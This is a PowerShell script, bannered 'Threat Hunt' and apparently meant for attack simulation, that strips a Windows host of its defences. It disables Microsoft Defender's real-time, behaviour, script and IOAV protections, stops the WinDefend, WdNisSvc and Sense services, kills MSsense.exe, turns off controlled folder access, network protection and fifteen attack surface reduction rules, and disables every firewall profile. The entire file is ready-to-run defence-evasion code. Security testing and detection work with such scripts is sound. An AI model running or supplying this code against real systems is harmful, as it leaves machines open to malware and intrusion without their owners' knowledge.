# ___________.__                          __     ___ ___               __  
# \__    ___/|  |_________   ____ _____ _/  |_  /   |   \ __ __  _____/  |
#   |    |   |  |  \_  __ \_/ __ \\__  \\   __\/    ~    \  |  \/    \   __\
#   |    |   |   Y  \  | \/\  ___/ / __ \|  |  \    Y    /  |  /   |  \  |
#   |____|   |___|  /__|    \___  >____  /__|   \___|_  /|____/|___|  /__|
#                 \/            \/     \/             \/            \/  

# Disable Microsoft Defender ATP Next Generation Protection
Write-Host "Attempting to disable functionalities of Microsoft Defender ATP Next Generation Protection"

Write-Host "Check If Defender DisableBehaviorMonitoring is enabled and If so disable"
$Preferences = Get-MpPreference
$OldDisableBehaviorMonitoring = $Preferences.DisableBehaviorMonitoring
if ($Preferences.DisableBehaviorMonitoring -eq $False) {Set-MpPreference -DisableBehaviorMonitoring $True}
Get-MpPreference | fl DisableBehaviorMonitoring

Write-Host "Check If Defender DisableBlockAtFirstSeen is enabled and If so disable"
$Preferences = Get-MpPreference
$OldDisableBlockAtFirstSeen = $Preferences.DisableBlockAtFirstSeen
if ($Preferences.DisableBlockAtFirstSeen -eq $False) {Set-MpPreference -DisableBlockAtFirstSeen $True}
Get-MpPreference | fl DisableBlockAtFirstSeen

Write-Host "Check If Defender DisableIOAVProtection is enabled and If so disable"
$Preferences = Get-MpPreference
$OldDisableIOAVProtection = $Preferences.DisableIOAVProtection
if ($Preferences.DisableIOAVProtection -eq $False) {Set-MpPreference -DisableIOAVProtection $True}
Get-MpPreference | fl DisableIOAVProtection

Write-Host "Check If Defender DisableRealtimeMonitoring is enabled and If so disable"
$Preferences = Get-MpPreference
$OldDisableRealtimeMonitoring = $Preferences.DisableRealtimeMonitoring
if ($Preferences.DisableRealtimeMonitoring -eq $False) {Set-MpPreference -DisableRealtimeMonitoring $True}
Get-MpPreference | fl DisableRealtimeMonitoring

Write-Host "Check If Defender DisableScriptScanning is enabled and If so disable"
$Preferences = Get-MpPreference
$OldDisableScriptScanning = $Preferences.DisableScriptScanning
if ($Preferences.DisableScriptScanning -eq $False) {Set-MpPreference -DisableScriptScanning $True}
Get-MpPreference | fl DisableScriptScanning

Write-Host "Attempting to disable WinDefend service"
Stop-Service -Name WinDefend -Force -PassThru -ErrorAction Ignore

Write-Host "Attempting to disable WdNisSvc service"
Stop-Service -Name WdNisSvc -Force -PassThru -ErrorAction Ignore

# Disable Microsoft Defender ATP Endpoint Detection & Response
Write-Host "Attempting to disable functioanlity of Microsoft Defender ATP Endpoint Detection Response"

Write-Host "Attempting to disable Sense service"
Stop-Service -Name Sense -Force -PassThru -ErrorAction Ignore

Write-Host "Attempting to kill MSsense.exe"
Taskkill /s system /f /IM MSsense.exe

# Disable Microsoft Defender ATP Attack Surface Reduction
Write-Host "Attempting to disable functionality of Microsoft Defender ATP Attack Surface Reduction"

Write-Host "Set EnableControlledFolderAccess to Disabled If currently setup as AuditMode or Enabled"
$Preferences = Get-MpPreference
$OldCFA = $Preferences.EnableControlledFolderAccess
if ($Preferences.EnableControlledFolderAccess -eq 1) {Set-MpPreference -EnableControlledFolderAccess 0}
elseif ($Preferences.EnableControlledFolderAccess -eq 2) {Set-MpPreference -EnableControlledFolderAccess 0}
Get-MpPreference | fl EnableControlledFolderAccess

Write-Host "Set EnableNetworkProtection to Disabled If currently setup as AuditMode or Enabled"
$Preferences = Get-MpPreference
$OldNP = $Preferences.EnableControlledFolderAccess
if ($Preferences.EnableNetworkProtection -eq 1) {Set-MpPreference -EnableNetworkProtection 0}
elseif ($Preferences.EnableNetworkProtection -eq 2) {Set-MpPreference -EnableNetworkProtection 0}
Get-MpPreference | fl EnableNetworkProtection

Write-Host "Check If Attack Surface Reduction rules are configured and If so disable"
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A, 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC, 92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B, 3B576869-A4EC-4529-8536-B80A7769E899, 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84, D3E037E1-3EB8-44C8-A917-57927947596D, BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550, 01443614-cd74-433a-b99e-2ecdc07bfc25, c1db55ab-c21a-4637-bb3f-a12568109d35, 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2, d1e49aac-8f56-4280-b9ba-993a6d77406c, b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4, 26190899-1602-49e8-8b27-eb1d0a1ce869, 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c, e6db77e5-3df2-4cf1-b95a-636979351e5b -AttackSurfaceReductionRules_Actions Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled, Disabled

# Disable Windows Firewall
Write-Host "Disable all Windows Firewall profiles"
$Preferences = Get-NetFirewallProfile
$OldFirewall = $Preferences.Enabled
if ($Preferences.Enabled -eq $True) {Set-NetFirewallProfile -All -Enabled False}
Get-NetFirewallProfile | fl Enabled
